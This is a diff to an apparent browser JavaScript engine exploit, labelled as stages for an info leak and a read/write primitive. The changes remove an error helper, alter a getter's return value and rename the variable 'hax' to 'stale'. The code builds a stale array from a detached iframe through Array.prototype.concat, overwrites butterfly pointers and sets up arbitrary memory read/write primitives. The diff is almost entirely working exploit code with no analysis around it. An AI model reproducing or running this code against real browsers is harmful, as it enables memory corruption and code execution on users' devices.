@@ -133,10 +133,6 @@ function zeroFill(number, width) {
 
 var nogc = [];
 
-var fail = function() {
-    alert.apply(null, arguments);
-    throw "fail";
-}
 /////////////////// STAGE 1: INFOLEAK ///////////////////
 
 failed = false
@@ -295,7 +291,7 @@ var dgc = function() {
     }
 
     /////////////////// STAGE 5: READ/WRITE PRIMITIVE ///////////////////
-Array.prototype.__defineGetter__(100, () => 1);
+Array.prototype.__defineGetter__(100, () => 0);
 var f = document.body.appendChild(document.createElement('iframe'));
 var a = new f.contentWindow.Array(13.37, 13.37);
 var b = new f.contentWindow.Array(u2d(leakJSVal.low + 0x10, leakJSVal.hi), 13.37);
@@ -313,38 +309,38 @@ tgt.d = 0x1337;
 
 var c = Array.prototype.concat.call(a, b);
 document.body.removeChild(f);
-var hax = c[0];
+var stale = c[0];
 
 tgt.c = c;
 
-hax[2] = 0;
-hax[3] = 0;
+stale[2] = 0;
+stale[3] = 0;
 
 Object.defineProperty(Array.prototype, 100, {
     get: undefined
 });
 
 tgt.c = leakval_helper;
-var butterfly = new int64(hax[2], hax[3]);
+var butterfly = new int64(stale[2], stale[3]);
 butterfly.low += 0x10;
 
 tgt.c = leakval_u32;
-var lkv_u32_old = new int64(hax[4], hax[5]);
-hax[4] = butterfly.low;
-hax[5] = butterfly.hi;
+var lkv_u32_old = new int64(stale[4], stale[5]);
+stale[4] = butterfly.low;
+stale[5] = butterfly.hi;
 // Setup read/write primitive
 
 tgt.c = master;
-hax[4] = leakval_u32[0];
-hax[5] = leakval_u32[1];
+stale[4] = leakval_u32[0];
+stale[5] = leakval_u32[1];
 
 var addr_to_slavebuf = new int64(master[4], master[5]);
 tgt.c = leakval_u32;
-hax[4] = lkv_u32_old.low;
-hax[5] = lkv_u32_old.hi;
+stale[4] = lkv_u32_old.low;
+stale[5] = lkv_u32_old.hi;
 
 tgt.c = 0;
-hax = 0;
+stale = 0;
 
 var prim = {
     write8: function(addr, val) {
